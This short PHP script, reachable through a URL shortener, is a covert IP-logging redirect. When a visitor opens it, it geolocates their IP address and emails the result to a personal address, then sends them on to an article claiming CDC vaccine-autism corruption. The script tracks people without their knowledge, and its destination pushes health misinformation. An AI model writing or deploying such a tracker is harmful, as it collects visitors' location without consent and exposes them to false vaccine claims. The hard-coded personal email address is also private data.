<?php
//http://api.mkgalaxy.com/ipRedirect.php
//http://goo.gl/eCGKlX

try {
  include('init.php');
  //pre defined variables
  $return['success'] = 1;
  $ip = !empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR'];
  $return['data'] = iptocity($ip);
  mail('naveenkhanchandani@gmail.com', 'ip from '.$ip, var_export($return, 1));
} catch (Exception $e) {
  
}
header("Location: http://live-news.us/2016/10/18/cdc-vaccines-and-autism-massive-corruption-exposed/");//https://www.youtube.com/results?search_query=kizomba
exit;
?>